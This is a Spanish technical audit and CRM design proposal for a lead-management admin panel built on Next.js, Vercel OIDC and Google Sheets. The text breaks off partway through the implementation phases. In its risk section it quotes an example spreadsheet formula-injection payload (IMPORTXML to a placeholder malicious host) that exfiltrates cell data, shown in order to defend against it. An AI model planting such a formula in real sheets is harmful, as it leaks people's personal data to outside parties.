# Auditoría Técnica y Propuesta de Arquitectura — CRM MVP Luma Premium

**Documento:** `docs/LUMA_PREMIUM_CRM_MVP_TECHNICAL_AUDIT.md`  
**Rama de Trabajo:** `feat/luma-premium-crm-mvp`  
**Fecha:** 15 de junio de 2026  
**Autor:** Antigravity (Senior Product Engineer)

---

## 1. Resumen Ejecutivo

Este informe presenta la auditoría técnica y propuesta de diseño para el panel administrativo (CRM MVP) de **Luma Premium**. La infraestructura del sitio web actual cuenta con un sistema de captación de leads en producción estable (`https://www.lumapremium.com`) autenticado de forma 100% segura mediante **Vercel OIDC** y **Google Cloud Workload Identity Federation (WIF)**, escribiendo directamente en la pestaña `Luma Leads V2` de un Google Spreadsheet sin usar claves JSON privadas.

El objetivo de esta fase es diseñar un panel administrativo privado para Marcos y William en las rutas `/admin`, `/admin/leads`, y `/admin/leads/[id]` para gestionar, actualizar y realizar seguimiento comercial de los prospectos de forma segura y ágil, sin interferir con la web pública ni con el ledger de captación en Sheets. 

Tras auditar el código, recomendamos la implementación de una **arquitectura sidecar utilizando pestañas separadas en Google Sheets** para almacenar la información operativa (estados, prioridad, responsables, notas, auditorías), sincronizándolos en memoria mediante un **Lead Fingerprint** determinista generado a partir de campos inmutables de captación, evitando modificar la hoja original `Luma Leads V2`.

---

## 2. Estado del Repositorio

A continuación, se detalla el estado actual del repositorio verificado localmente:

* **Rama activa:** `feat/luma-premium-crm-mvp` (`CONFIRMADO EN CÓDIGO`).
* **Estado del árbol de trabajo:** Limpio (sin archivos modificados sin confirmar) (`CONFIRMADO EN CÓDIGO`).
* **Origen Remoto (Remote):** `https://github.com/hilariotapiamarcosantonio-maker/luma_premium.git` (`CONFIRMADO EN CÓDIGO`).
* **Historial Reciente (Últimos 10 commits en main/feat):** (`CONFIRMADO EN CÓDIGO`)
  * `b98e340` docs: record multilingual production deployment QA
  * `390f82c` merge: integrate multilingual diagnostic and secure OIDC leads
  * `f2e1312` fix: complete English solution detail experience
  * `dafb357` fix: resolve OIDC Sheets submission failure
  * `61bf098` feat: authenticate Google Sheets through Vercel OIDC
  * `be0d98d` test: validate multilingual leads V2 integration
  * `77c6a37` fix: polish multilingual diagnostic visual experience
  * `8a6e5a9` fix: harden multilingual diagnostic flow and Sheets V2
  * `c9c0cad` docs: add Tier 1 commercial, legal readiness, and architecture guides
  * `71aa7e2` feat: add Spanish and English site architecture with language switcher

---

## 3. Stack Tecnológico Confirmado

Se ha verificado la configuración de `package.json` y los archivos de configuración raíz, encontrando lo siguiente:

* **Next.js:** Versión `16.2.4` con **App Router** (`CONFIRMADO EN CÓDIGO`).
* **React / React-DOM:** Versión `19.2.4` (`CONFIRMADO EN CÓDIGO`).
* **Tailwind CSS:** Versión `4` (utilizando la integración CSS-first `@tailwindcss/postcss`) (`CONFIRMADO EN CÓDIGO`).
* **TypeScript:** Versión `^5` (configuración estricta en `tsconfig.json`) (`CONFIRMADO EN CÓDIGO`).
* **Linter:** ESLint `^9` configurado con `eslint.config.mjs` (`CONFIRMADO EN CÓDIGO`).
* **Animaciones:** Framer Motion `^12.38.0` (`CONFIRMADO EN CÓDIGO`).
* **Iconografía:** Lucide React `^1.11.0` (`CONFIRMADO EN CÓDIGO`).
* **Dependencias de Google Auth & API:** (`CONFIRMADO EN CÓDIGO`)
  * `@vercel/oidc`: `^3.6.1`
  * `google-auth-library`: `^10.7.0`
  * `googleapis`: `^171.4.0`
* **Dependencias de desarrollo auxiliares:** `exceljs ^4.4.0` (`CONFIRMADO EN CÓDIGO`).
* **Mecanismo de i18n:** El proyecto utiliza enrutamiento estático en lugar de middleware dinámico (`CONFIRMADO EN CÓDIGO`). Los directorios de páginas en español están en la raíz de `src/app/` (ej: `src/app/diagnostico`) y los de inglés están anidados bajo `src/app/en/` (ej: `src/app/en/assessment`).
* **Gestión de Errores y Logging:** Sanitizado en el servidor mediante `classifyGcpFailure` en `src/lib/google-auth.ts` para no escribir ni exponer tokens JWT, claves ni información personal en logs (`CONFIRMADO EN CÓDIGO`).

---

## 4. Árbol de Carpetas Relevante

Estructura de directorios clave del proyecto (`CONFIRMADO EN CÓDIGO`):

```text
F:\Luma Premium\
├── .env.example              # Plantilla de variables de entorno
├── .env.local               # Configuración local de desarrollo
├── eslint.config.mjs         # Configuración del linter
├── next.config.ts            # Configuración de Next.js
├── package.json              # Dependencias y scripts
├── tsconfig.json             # Configuración de TypeScript
├── docs/                     # Documentación existente
│   ├── LUMA_LEADS_V2_SHEET_SCHEMA_EXACT.md # Esquema de la pestaña Leads V2
│   ├── LUMA_PREMIUM_VERCEL_GCP_OIDC_INTEGRATION.md # Explicación de OIDC
│   └── LUMA_PREMIUM_OIDC_PREVIEW_QA.md # Detalles de pruebas en Preview
├── scripts/                  # Scripts utilitarios locales
│   └── create-luma-leads-v2-sheet.mjs # Script creador de pestañas
├── src/
│   ├── actions/              # (No existen actualmente, reservado para CRM)
│   ├── app/                  # Next.js App Router
│   │   ├── layout.tsx        # Layout global
│   │   ├── page.tsx          # Homepage con redirección
│   │   ├── api/
│   │   │   └── luma-leads/
│   │   │       └── route.ts  # Endpoint POST para captación de leads
│   │   ├── diagnostico/
│   │   │   └── page.tsx      # Formulario Diagnóstico ES
│   │   └── en/
│   │       ├── page.tsx      # Homepage EN
│   │       └── assessment/
│   │           └── page.tsx  # Formulario Diagnóstico EN
│   ├── components/
│   │   ├── diagnostico/
│   │   │   └── DiagnosticoMaestroForm.tsx # Lógica de formulario ES/EN
│   │   ├── luma-estate/
│   │   │   └── DiagnosticoForm.tsx # Componente antiguo de diagnóstico
│   │   └── site/
│   │       └── (componentes compartidos como header y footer)
│   └── lib/                  # Utilidades del servidor
│       ├── google-auth.ts    # Lógica de conexión Vercel OIDC + WIF
│       ├── google-sheets.ts  # Escritura append en Google Sheets
│       ├── site.ts           # Configuración de enlaces y constantes
│       └── solutions.ts      # Datos estáticos de soluciones
```

---

## 5. Flujo Actual de los Formularios

La captación y persistencia de prospectos opera de la siguiente manera (`CONFIRMADO EN CÓDIGO`):

1. **Puntos de entrada:** El usuario interactúa con `/diagnostico` (ES) o `/en/assessment` (EN). Ambos formularios importan y renderizan el componente `DiagnosticoMaestroForm.tsx`.
2. **Prevención de Doble Envío:** El componente de UI implementa dos bloqueos: un bloqueo síncrono mediante `useRef(false)` al inicio de `handleSubmit()` y un bloqueo funcional desactivando el botón de envío (`disabled={submitting}`).
3. **Endpoint de Envío:** Se realiza un `POST` al endpoint `/api/luma-leads/route.ts` con el cuerpo formateado.
4. **Honeypot:** El campo oculto `_website` filtra bots de forma pasiva; si contiene datos, el endpoint simula éxito (`200 OK`) pero no ejecuta la escritura en Google Sheets.
5. **Validación en el Servidor:** 
   - Se valida el formato de correo mediante expresión regular y longitud `<= 200`.
   - Se valida el teléfono (eliminando caracteres no numéricos, verificando longitud de dígitos `7-20` y total de caracteres `<= 30`).
   - Se asegura la presencia de campos obligatorios (`country`, `role`, `industry`, `team_size`, `advertising_status`, `main_bottleneck`, `investment_range`) y el consentimiento explícito de contacto (`consent_contact === true`).
6. **Enrutamiento por Versión:**
   - Si `schema_version === "2"`: Se llama a `appendLumaLeadV2()` en `src/lib/google-sheets.ts` pasando la estructura mapeada.
   - Si no se especifica versión (legacy V1): Se llama a `appendLumaLead()` escribiendo un array simple de 10 elementos en `Luma Leads V1!A:J`.
7. **Normalización y Timestamp:** En V2, el backend genera automáticamente `created_at` usando `new Date().toISOString()`, asigna el estado inicial `status = "nuevo"`, fuerza a minúsculas el correo, y escapa caracteres HTML (`<` y `>`) de las entradas mediante la función utilitaria `sanitize()`.
8. **Estructura de Destino:** Se escribe mediante append en la pestaña `Luma Leads V2` en el rango fijo `A:AC`.

---

## 6. Implementación Real de OIDC

La autenticación de la aplicación frente a Google Cloud Platform (GCP) se realiza de forma totalmente segura sin utilizar archivos de clave JSON estáticas (`CONFIRMADO EN CÓDIGO`):

1. **Origen de Identidad:** Vercel inyecta automáticamente un token JWT seguro y de corta duración (`VERCEL_OIDC_TOKEN`) en el entorno de ejecución de las Serverless Functions.
2. **Generación del Cliente Auth:** La función `getGcpSheetsAuthClient()` en `src/lib/google-auth.ts` inicializa un cliente `IdentityPoolClient` de la biblioteca `google-auth-library`.
3. **Flujo de Intercambio (STS):** El cliente envía el JWT de Vercel al endpoint STS de Google (`https://sts.googleapis.com/v1/token`) validando el Audience restringido (`GCP_PROJECT_NUMBER`, `GCP_WORKLOAD_IDENTITY_POOL_ID`, `GCP_WORKLOAD_IDENTITY_POOL_PROVIDER_ID`).
4. **Impersonación:** Google STS devuelve un token federado. El cliente lo utiliza para llamar al API de IAM Credentials (`generateAccessToken`) impersonando al Service Account `luma-premium-web-leads@luma-premium-production.iam.gserviceaccount.com`.
5. **Permisos y Scopes:** Devuelve un token de acceso temporal de GCP restringido únicamente al scope de Google Sheets (`https://www.googleapis.com/auth/spreadsheets`).
6. **Entornos Soportados:** 
   - **Producción:** Totalmente integrado y en funcionamiento.
   - **Preview (Vercel):** Configurado permitiendo el paso del token mediante la configuración de audiencias GCP (`https://vercel.com/<team>`).
   - **Local:** No soporta OIDC (lanza un error `OidcTokenError` clasificado como `503 Service Unavailable`). Esto es intencional para evitar usar claves privadas.

---

## 7. Integración Real con Google Sheets

El cliente de hojas de cálculo de Google está configurado de la siguiente manera (`CONFIRMADO EN CÓDIGO`):

* **Instanciación:** Se crea un cliente de Sheets usando `google.sheets({ version: 'v4', auth })` donde `auth` es la instancia del `IdentityPoolClient`.
* **Escritura V2:** Se invoca `sheets.spreadsheets.values.append` apuntando al identificador de la hoja cargado desde `LUMA_LEADS_SPREADSHEET_ID` y rango `${LUMA_LEADS_SHEET_V2_NAME}!A:AC`.
* **Configuración del Input:** Se utiliza `valueInputOption: 'RAW'`. Esto es crítico para la seguridad ya que impide la ejecución involuntaria de fórmulas si un lead ingresa un valor que comience con `=` (mitiga CSV/Formula Injection).
* **Ciclo de Vida:** El cliente de Google Sheets se genera bajo demanda por cada petición (`getGcpSheetsAuthClient()` crea un cliente nuevo en cada llamada) para evitar fugas de token o reuso de sesiones expiradas en peticiones Serverless asíncronas.

---

## 8. Estructura Confirmada de Luma Leads V2

La pestaña `Luma Leads V2` del Spreadsheet ID configurado contiene exactamente una matriz de 29 columnas correspondientes al rango `A` a `AC` (`CONFIRMADO EN CÓDIGO`):

| Columna | Campo | Descripción |
| :---: | :--- | :--- |
| **A** | `schema_version` | Versión del esquema del formulario (siempre `"2"` para V2) |
| **B** | `created_at` | Marca de tiempo ISO del envío (UTC) |
| **C** | `locale` | Idioma de procedencia (`"es"` o `"en"`) |
| **D** | `country` | Código de país seleccionado |
| **E** | `full_name` | Nombre completo del prospecto |
| **F** | `email` | Correo electrónico sanitizado en minúsculas |
| **G** | `phone` | Teléfono de contacto |
| **H** | `company` | Nombre de la empresa |
| **I** | `role` | Rol del contacto en la empresa |
| **J** | `industry` | Sector industrial seleccionado |
| **K** | `industry_detail` | Detalle específico de la industria (campo abierto) |
| **L** | `team_size` | Rango de tamaño de equipo |
| **M** | `lead_volume` | Volumen mensual estimado de leads |
| **N** | `acquisition_channels` | Canales actuales de captación |
| **O** | `advertising_status` | Estatus actual de inversión publicitaria |
| **P** | `current_tools` | Herramientas/Software en uso |
| **Q** | `main_bottleneck` | Cuello de botella comercial principal |
| **R** | `desired_outcome` | Objetivo o resultado deseado |
| **S** | `solution_interest` | Sistemas/Soluciones Luma de interés |
| **T** | `timeline` | Plazo previsto de implementación |
| **U** | `investment_range` | Presupuesto o rango de inversión |
| **V** | `source` | Origen del formulario (ej: `"diagnostico"`) |
| **W** | `page_origin` | URL de la página de envío |
| **X** | `utm_source` | Parámetro UTM: Origen |
| **Y** | `utm_medium` | Parámetro UTM: Medio |
| **Z** | `utm_campaign` | Parámetro UTM: Campaña |
| **AA**| `utm_content` | Parámetro UTM: Contenido |
| **AB**| `utm_term` | Parámetro UTM: Término |
| **AC**| `status` | Estatus comercial inicial (siempre guardado como `"nuevo"`) |

---

## 9. Riesgos Encontrados e Impacto Comercial

Tras analizar detalladamente el flujo técnico del proyecto, identificamos los siguientes riesgos clave a mitigar en la fase de diseño del CRM:

1. **Inexistencia de un Identificador Único Stable (`RECOMENDACIÓN`):**
   * *Riesgo:* La hoja `Luma Leads V2` no genera IDs únicos incrementales (como un autoincremento en SQL) ni UUIDs. Confiar en la posición de la fila (`row_index`) como ID en el CRM es un error crítico, ya que si Marcos o William ordenan, filtran o eliminan filas manualmente en Google Sheets, el CRM mostrará datos cruzados o actualizará el prospecto equivocado.
   * *Solución:* Implementar una estrategia robusta de identidad mediante la generación de un fingerprint determinista e inmutable:
     ```text
     source_fingerprint = sha256(
       schema_version +
       created_at +
       locale +
       normalized_email +
       normalized_phone +
       normalized_company
     )
     ```
     El `lead_id` debe generarse una sola vez cuando el lead se registra en `Luma CRM Leads` y no debe cambiar posteriormente.

2. **Edición Simultánea y Sobreescritura (`RECOMENDACIÓN`):**
   * *Riesgo:* Si Marcos y William abren el mismo lead y modifican campos al mismo tiempo, el que guarde último sobreescribirá silenciosamente la información del primero (Race Condition).
   * *Solución:* Incorporar un campo `version` (entero autoincremental de control) en el registro operativo del CRM. Toda actualización verificará que la versión enviada coincide con la versión actual en la hoja de cálculo antes de persistir el cambio.

3. **Inyección de Fórmulas Maliciosas en Google Sheets (`CONFIRMADO EN CÓDIGO` / `RECOMENDACIÓN`):**
   * *Riesgo:* Un usuario malintencionado podría ingresar texto en los formularios que comience con `=` (por ejemplo, `=IMPORTXML("http://sitio-malicioso.com/leak?data="&F3, "/a")`). Si la aplicación lee este valor y lo procesa de forma insegura, podría ejecutar peticiones externas en la cuenta de Google o filtrar datos confidenciales.
   * *Solución:* El sistema actual ya utiliza `valueInputOption: 'RAW'` en la escritura de captación (`CONFIRMADO EN CÓDIGO`). Mantendremos este estándar estricto para todas las escrituras y actualizaciones que realice el CRM.

4. **Límites de Cuotas del API de Google Sheets (`RECOMENDACIÓN`):**
   * *Riesgo:* Cuota exacta pendiente de verificar contra la configuración y documentación aplicable al proyecto de Google Cloud.
   * *Solución:* Con dos usuarios iniciales, Sheets es suficiente para el MVP, siempre que la DAL evite lecturas redundantes (por ejemplo, implementando una caché de corta duración en memoria de 10-15 segundos para las consultas generales).

5. **Modificación Accidental del Esquema (`RECOMENDACIÓN`):**
   * *Riesgo:* Si un usuario edita manualmente la hoja de cálculo y añade columnas entre `A` y `AC`, el mapeador de columnas `appendLumaLeadV2` sufrirá desalineación de datos.
   * *Solución:* Documentar e implementar protección de celdas en el Google Sheet directamente, restringiendo la edición de la fila de cabecera (Fila 1) y las columnas críticas solo para la cuenta de servicio de GCP.

---

## 10. Arquitectura Recomendada para el CRM MVP

Para cumplir con el requerimiento de construir un panel privado sin afectar la web pública y utilizando la conexión OIDC existente, evaluamos las siguientes tres opciones:

### Alternativas de Arquitectura Evaluadas:

1. **Estrategia A (Escribir columnas adicionales después de la columna AC en Luma Leads V2):**
   * *Cómo funciona:* Agregar columnas para "Asignado", "Próxima Acción", "Notas", etc., en la misma pestaña.
   * *Evaluación:* **No recomendada**. Provoca riesgo de interferencia. Si el API de captación realiza un append y la hoja tiene filtros o cambios de estructura, puede corromperse el flujo estable actual. Además, no permite manejar relaciones de 1-a-muchos (como tener múltiples notas internas con fecha e ID por prospecto).

2. **Estrategia B (Base de Datos Externa - PostgreSQL/Supabase):**
   * *Cómo funciona:* Los leads se sincronizan a una base de datos Postgres donde se opera el CRM de forma nativa.
   * *Evaluación:* **Excelente a largo plazo, pero con complejidad añadida para el MVP**. Requiere el aprovisionamiento de una base de datos externa, configuración de claves y cadenas de conexión en Vercel (lo que rompe la simplicidad de "no utilizar claves"), y escribir un mecanismo de sincronización bidireccional o disparadores.

3. **Estrategia C (Arquitectura Sidecar en Hojas Separadas del mismo Spreadsheet - RECOMENDADA):**
   * *Cómo funciona:* La pestaña `Luma Leads V2` se trata estrictamente como un **ledger de solo lectura** para el CRM. El panel administrativo opera escribiendo en tres nuevas pestañas operativas en la misma hoja de cálculo: `Luma CRM Leads` (para variables de CRM), `Luma CRM Notes` (para la bitácora de notas) y `Luma CRM Audit` (para cambios de estado).
   * *Evaluación:* **La mejor opción para el MVP**. Reutiliza la conexión Vercel OIDC existente (que ya tiene permisos completos de lectura/escritura sobre el documento), no requiere bases de datos externas ni credenciales adicionales, y separa la captación pública de la gestión de leads privada.

> [!IMPORTANT]
> **Decisión de Diseño Inalterable:**
> Luma Leads V2 es append-only para el flujo público y read-only para el CRM. Las mutaciones comerciales se realizan únicamente en las pestañas sidecar (`Luma CRM Leads`, `Luma CRM Notes`, `Luma CRM Audit`).

```
                    ┌────────────────────────────────────────┐
                    │          Google Spreadsheet            │
                    └───────────────────┬────────────────────┘
                                        │
             ┌──────────────────────────┴──────────────────────────┐
             ▼                                                     ▼
     Pestañas de Captación (Solo Lectura CRM)            Pestañas CRM Operativo (Lectura/Escritura CRM)
     ┌────────────────────────┐                          ┌──────────────────────────────────────────┐
     │ - Luma Leads V1 (Legacy)│                          │ - Luma CRM Leads (Estado/Asignados)      │
     │ - Luma Leads V2        │◄─── [Lead Fingerprint] ──►│ - Luma CRM Notes (Historial Notas B2B)   │
     └────────────────────────┘        (Join en Memoria) │ - Luma CRM Audit (Historial de Cambios)  │
             ▲                                           └────────────────────┬─────────────────────┘
             │                                                                ▲
      Formulario Público                                            Server Actions (CRM)
    (POST /api/luma-leads)                                         (Detrás de Autenticación)

---

## Sincronización idempotente de leads

Para detectar y procesar leads nuevos en el CRM sin duplicar registros y garantizando la idempotencia, se implementará el siguiente flujo de sincronización y procesamiento de datos:

```text
Luma Leads V2
→ normalizar registro
→ generar source_fingerprint
→ buscar en Luma CRM Leads
→ crear registro operativo si no existe
→ conservar el existente si ya está sincronizado
```

### Detección de Leads Nuevos sin Duplicados

1. **Normalización:** Cada lead obtenido de `Luma Leads V2` se normaliza en el servidor (correos a minúsculas, eliminación de espacios, estandarización de números de teléfono y nombres de empresa).
2. **Generación de Huella de Origen:** Se genera un hash SHA-256 inmutable utilizando la fórmula de identidad:
   ```text
   source_fingerprint = sha256(
     schema_version +
     created_at +
     locale +
     normalized_email +
     normalized_phone +
     normalized_company
   )
   ```
3. **Búsqueda:** Se busca la huella de origen (`source_fingerprint`) en la columna `lead_id` de la pestaña `Luma CRM Leads`.
4. **Idempotencia:**
   - **Lead no sincronizado:** Si no existe ningún registro con ese `lead_id` en `Luma CRM Leads`, se crea un nuevo registro operativo con su `lead_id` (cuyo valor se asigna a partir del `source_fingerprint` calculado una sola vez y no debe cambiar posteriormente), inicializando su estado comercial a "Nuevo".
   - **Lead ya sincronizado:** Si el `lead_id` ya existe en `Luma CRM Leads`, se conserva el registro tal como está sin duplicar ni realizar mutaciones adicionales.

---

## Contrato Conceptual de Repositorio

Para la Capa de Acceso a Datos (DAL), se define el siguiente contrato conceptual de repositorio. Esta interfaz sirve únicamente con fines de documentación en esta fase (no se deben crear los archivos TypeScript correspondientes):

```ts
interface CrmRepository {
  listLeads(filters: LeadFilters): Promise<PaginatedLeads>;
  getLeadById(leadId: string): Promise<LeadDetail | null>;
  syncNewLeads(): Promise<SyncResult>;
  updateCommercialState(input: UpdateLeadInput): Promise<void>;
  addNote(input: AddNoteInput): Promise<void>;
}
```

---

## 11. Modelo de Datos Operativo

Para la arquitectura Sidecar, el CRM leerá los leads de captación desde `Luma Leads V2`, calculará el identificador único virtual `lead_id`, y realizará un JOIN en memoria con las siguientes tres pestañas de Google Sheets (`RECOMENDACIÓN`):

### Pestaña 1: `Luma CRM Leads` (Datos comerciales del Lead)

Representa las variables de control comercial del prospecto. Si un lead nuevo no tiene fila aquí, el CRM asume valores por defecto (ej: Estado = "Nuevo", Prioridad = "Media", Asignado = "Ninguno").

| Campo | Tipo | Requerido | Descripción |
| :--- | :--- | :---: | :--- |
| `lead_id` | String | Sí (PK) | Identificador generado una sola vez a partir de `source_fingerprint` al registrarse en `Luma CRM Leads` y que permanece inmutable |
| `status` | String | Sí | Estado: `Nuevo`, `Por contactar`, `Contactado`, `Reunión agendada`, `Propuesta enviada`, `Negociación`, `Ganado`, `Perdido` |
| `priority` | String | Sí | Prioridad: `alta`, `media`, `baja` (por defecto `media`) |
| `owner_email` | String | No | Correo de Marcos o William asignado a este lead |
| `next_action` | String | No | Texto breve con el siguiente paso comercial a realizar |
| `follow_up_at` | DateTime (ISO) | No | Fecha/Hora planificada para la siguiente acción comercial |
| `first_contact_at` | DateTime (ISO) | No | Fecha/Hora del primer contacto comercial efectivo |
| `last_contact_at` | DateTime (ISO) | No | Fecha/Hora del último contacto realizado |
| `lost_reason` | String | No | Razón de pérdida (obligatorio si `status == "Perdido"`) |
| `won_value` | Number | No | Valor comercial del contrato ganado (si `status == "Ganado"`) |
| `currency` | String | No | Divisa del valor ganado (ej: `"USD"`, `"EUR"`) |
| `tags` | String | No | Etiquetas separadas por comas (ej: `"High Ticket"`, `"Proptech"`) |
| `updated_at` | DateTime (ISO) | Sí | Marca de tiempo del último cambio |
| `updated_by` | String | Sí | Email del usuario del CRM que realizó la edición |
| `version` | Number | Sí | Versión secuencial para control de concurrencia (inicia en `1`) |
| `archived_at` | DateTime (ISO) | No | Fecha de archivado (los leads archivados no aparecen en la lista por defecto) |

### Pestaña 2: `Luma CRM Notes` (Historial de Notas)

Colección de comentarios y notas de seguimiento (relación 1-a-muchos).

| Campo | Tipo | Requerido | Descripción |
| :--- | :--- | :---: | :--- |
| `note_id` | String | Sí (PK) | UUID generado en el servidor |
| `lead_id` | String | Sí (FK) | Relación con `Luma CRM Leads.lead_id` |
| `body` | String | Sí | Contenido del comentario (máximo 2000 caracteres) |
| `created_at` | DateTime (ISO) | Sí | Fecha/Hora de creación de la nota |
| `created_by` | String | Sí | Email de Marcos o William autor del comentario |

### Pestaña 3: `Luma CRM Audit` (Auditoría de Cambios)

Historial inmutable para trazabilidad comercial y control de actividad.

| Campo | Tipo | Requerido | Descripción |
| :--- | :--- | :---: | :--- |
| `event_id` | String | Sí (PK) | UUID generado en el servidor |
| `lead_id` | String | Sí (FK) | Relación con `Luma CRM Leads.lead_id` |
| `event_type` | String | Sí | Tipo de evento (ej: `UPDATE_STATUS`, `ASSIGN_LEAD`, `ARCHIVE_LEAD`) |
| `changed_fields` | String (JSON) | Sí | Objeto con los cambios (ej: `{"status": {"from": "Nuevo", "to": "Contactado"}}`) |
| `from_status` | String | No | Estado comercial origen (opcional) |
| `to_status` | String | No | Estado comercial destino (opcional) |
| `actor_email` | String | Sí | Email del usuario responsable del cambio |
| `created_at` | DateTime (ISO) | Sí | Fecha/Hora de registro del evento |
| `request_id` | String | No | Identificador de petición de Next.js para debug |

---

## 12. Estrategia de Autenticación para Marcos y William

Para asegurar que únicamente Marcos y William tengan acceso al CRM, comparamos las siguientes alternativas (`RECOMENDACIÓN`):

1. **Auth.js (NextAuth.js) con Google OAuth + Allowlist (RECOMENDADA):**
   * *Cómo funciona:* Integra inicio de sesión mediante Google Accounts. El servidor Next.js valida el perfil retornado de Google y verifica si el correo electrónico coincide exactamente con la lista de usuarios autorizados.
   * *Pros:* 
     * Marcos y William ya utilizan Google Workspace, por lo que no deben recordar claves nuevas.
     * Soporta verificación en dos pasos (2FA) de forma nativa a través de Google.
     * Seguridad de grado empresarial sin costo de licencias.
     * Excelente compatibilidad con dispositivos móviles.
   * *Cons:* Requires configurar un Cliente Google OAuth en la consola de GCP.

2. **Vercel Authentication (SSO de despliegue):**
   * *Cómo funciona:* Restringe el acceso a todo el dominio mediante Vercel SSO.
   * *Pros:* Ya activo en vistas previas.
   * *Cons:* Solo protege el entorno, no permite identificar roles de usuario dentro de la aplicación para registrar auditorías o autorizar acciones individuales.

3. **Contraseña Única Compartida (Basic Auth):**
   * *Cómo funciona:* Contraseña estática definida en variables de entorno.
   * *Pros:* Simple de programar.
   * *Cons:* **Inaceptable para producción**. No permite auditoría individualizada (no sabemos si escribe Marcos o William), no tiene 2FA, y si se filtra requiere redeploy para cambiarse.

**Recomendación Final de Autenticación:** Implementar **Auth.js (v5 / NextAuth.js)** configurando el proveedor de **Google**. Se definirá una variable de entorno `ALLOWED_CRM_EMAILS=marcos@...,william@...` que actuará como filtro estricto de acceso.

---

## 13. Roles e Identidades Comerciales

Se definen dos roles específicos basados en el perfil de los usuarios (`RECOMENDACIÓN`):

### 1. Rol: Marcos (Administrador — `admin`)
* **Permisos habilitados:**
  * Acceso total a dashboards de métricas globales de conversión y funnel.
  * Ver, buscar y filtrar todos los leads.
  * Cambiar asignación de leads (asignar a William o autoasignarse).
  * Cambiar estados comerciales de cualquier lead.
  * Crear y eliminar notas comerciales.
  * Visualizar bitácora completa de auditoría (`Luma CRM Audit`).
  * Archivar leads antiguos o duplicados.
  * Forzar sincronización manual desde Google Sheets.

### 2. Rol: William (Comercial / Ventas — `sales`)
* **Permisos habilitados:**
  * Acceso a métricas de su propio funnel comercial.
  * Ver, buscar y filtrar leads asignados a su correo.
  * Registrar notas comerciales e indicar la "Próxima Acción" y "Fecha de Seguimiento".
  * Cambiar estados comerciales únicamente de sus leads asignados.
* **Acciones restringidas (Bloqueo 403):**
  * No puede cambiar la asignación de leads a otros usuarios.
  * No puede eliminar notas (propias o ajenas).
  * No puede archivar leads.
  * No puede visualizar la hoja completa de auditoría.

---

## 14. Arquitectura de Rutas del CRM

Se propone la siguiente estructura de enrutamiento bajo el prefijo privado `/admin` (`RECOMENDACIÓN`):

```text
src/app/
└── admin/
    ├── layout.tsx         # Layout administrativo (Sidebar, Session Context)
    ├── page.tsx           # Dashboard comercial (Métricas, Gráficos de embudo)
    ├── login/
    │   └── page.tsx       # Interfaz pública de autenticación Google OAuth
    └── leads/
        ├── page.tsx       # Tabla principal de leads (Búsqueda, Filtros avanzados)
        └── [id]/
            └── page.tsx   # Ficha interactiva de prospecto y línea de tiempo
```

Todas las rutas administrativas que exponen o manejan PII deben configurarse como privadas y dinámicas, evitando caching redundante en CDNs o almacenamiento del lado del navegador:
```text
dynamic = "force-dynamic"
cache: "no-store"
```
No se recomienda bajo ningún concepto el uso de caché público, CDN, ni parámetros de consulta en la URL (query parameters) que contengan datos de PII tales como nombre, correo electrónico o teléfono.

### Detalle de Vistas:
* `/admin/login`: Pantalla premium con estética Luma (Dark mode, efecto glassmorphic), mostrando un botón prominente: "Acceder con Google Workspace".
* `/admin`: Dashboard inicial que carga tarjetas animadas con: Leads Nuevos, Tasa de Conversión, Presupuesto Estimado Ganado, y Tareas Pendientes para el día.
* `/admin/leads`: Vista de tabla tipo hoja de cálculo premium que permite buscar por texto y filtrar interactivamente por Estado, País, Idioma y Responsable.
* `/admin/leads/[id]`: Ficha completa que lee los 29 campos de captación de Sheets (a través del `lead_id`), y renderiza el historial de comentarios y actualizaciones.

---

## 15. Catálogo de Componentes del CRM MVP

Estructura de componentes recomendada para mantener modularidad y legibilidad (código `< 150` líneas por archivo) (`RECOMENDACIÓN`):

```text
src/components/admin/
├── AdminSidebar.tsx      # Menú de navegación colapsable optimizado para móvil
├── MetricCard.tsx        # Tarjeta con micro-animaciones (Framer Motion) para KPI
├── LeadsTable.tsx        # Tabla interactiva con estados de carga (skeletons)
├── FilterBar.tsx         # Grupo de selectores reactivos para segmentar prospectos
├── StatusSelector.tsx    # Menú desplegable para cambiar el estado comercial
├── NoteForm.tsx          # Formulario flotante para ingresar notas sin refrescar
└── TimelineFeed.tsx      # Línea de tiempo visual combinando notas y auditoría
```

* **Estética Visual Premium:** Seguir la guía visual existente de Luma. Tipografía limpia (Inter o Outfit), fondos en tonos oscuros sofisticados (`bg-neutral-950`, `bg-neutral-900`), bordes sutiles en gris plata, acentos en oro o ámbar para elementos de alta prioridad, y transiciones fluidas de 150ms al hacer hover en botones y filas.

---

## 16. Protocolos y Controles de Seguridad

Para proteger la información personal (PII) de los leads y garantizar la robustez del sistema, se proponen los siguientes mecanismos técnicos (`RECOMENDACIÓN`):

1. **Data Access Layer (DAL) Server-Only:**
   * La biblioteca `googleapis` y los clientes de Sheet nunca deben ser cargados en el frontend. Todos los métodos de lectura/escritura se marcarán con `'use server'` en sus archivos o se mantendrán protegidos bajo Server Actions verificando la sesión activa (`const session = await auth()`).

2. **No Filtración de PII en URLs ni Logs:**
   * Queda estrictamente prohibido utilizar correos electrónicos, teléfonos o nombres en la query string de las URLs. Toda navegación a fichas usará el hash determinista `lead_id` en la ruta `/admin/leads/[id]`.
   * Los mensajes de error capturados por el clasificador nunca imprimirán datos del lead ni tokens de acceso en los sistemas de logs de Vercel.
   * Las rutas del segmento `/admin` que manejan datos sensibles deben forzar la carga dinámica en Next.js para evitar la fuga de datos por pre-renderizado o CDN:
     ```text
     dynamic = "force-dynamic"
     cache: "no-store"
     ```
     No se permite el uso de caché público ni almacenamiento en CDN para estas rutas.

3. **Restricción de Exportación de Datos:**
   * La acción de descargar prospectos en formato CSV o Excel estará restringida por middleware y Server Action únicamente a usuarios con el rol `admin` (Marcos). William no tendrá botón para exportar masivamente la base de datos.

4. **Validación de Tipos Estricta:**
   * Todos los payloads enviados desde el cliente (como cambios de estado o inserción de notas) serán validados mediante esquemas de **Zod** antes de proceder a la llamada de Google Sheets.

5. **Prevención de Indizado de Motores de Búsqueda:**
   * Configurar `export const metadata = { robots: 'noindex, nofollow' }` en todo el segmento `/admin` para evitar la indexación accidental en Google Search u otros buscadores.

---

## 17. Fases Planificadas de Implementación

Sugerencia de secuencia de desarrollo para entregar el CRM MVP de forma segura (`RECOMENDACIÓN`):

* **Fase 1 — Preparación de Entorno e Infraestructura:**
  * Creación manual de las 3 pestañas adicionales (`Luma CRM Leads`, `Luma CRM Notes`, `Luma CRM Audit`) en el Google Sheet comercial usando la cabecera correspondiente.
